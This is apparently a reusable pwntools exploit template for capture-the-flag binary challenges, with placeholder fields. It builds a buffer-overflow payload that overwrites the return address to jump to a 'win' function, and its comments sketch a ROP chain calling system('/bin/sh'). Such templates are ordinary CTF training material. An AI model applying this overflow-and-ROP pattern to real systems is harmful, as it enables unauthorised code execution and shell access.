#!/usr/bin/env python3
"""
Challenge: [Name]
CTF: [CTF Name]
Category: Pwn
Date: YYYY-MM-DD

Vulnerability: [Buffer overflow / format string / UAF / etc.]
"""

from pwn import *

# ─── Config ───────────────────────────────────────────────────────────────────
BINARY = './binary'
HOST   = 'chall.ctf.com'
PORT   = 1337

context.binary = elf = ELF(BINARY)
context.log_level = 'info'   # debug / info / warning

# ─── Choose target ────────────────────────────────────────────────────────────
LOCAL = True

if LOCAL:
    p = process(BINARY)
    # p = gdb.debug(BINARY, gdbscript='break main\ncontinue')
else:
    p = remote(HOST, PORT)

# ─── Helpers ──────────────────────────────────────────────────────────────────
def send_payload(payload):
    p.recvuntil(b'> ')   # adjust to actual prompt
    p.sendline(payload)

# ─── Exploit ──────────────────────────────────────────────────────────────────

# 1. Find offset
offset = 64   # cyclic_find(b'faab') after running: cyclic(200)

# 2. Build ROP chain (if needed)
rop = ROP(elf)
# rop.call(elf.sym['win'])         # ret2win
# rop.call(elf.sym['system'], [next(elf.search(b'/bin/sh\x00'))])  # ret2system

# 3. Build payload
payload  = b'A' * offset
payload += p64(elf.sym['win'])    # adjust
# payload += rop.chain()

log.info(f"Payload: {payload!r}")

# 4. Send
send_payload(payload)

# 5. Interact
p.interactive()
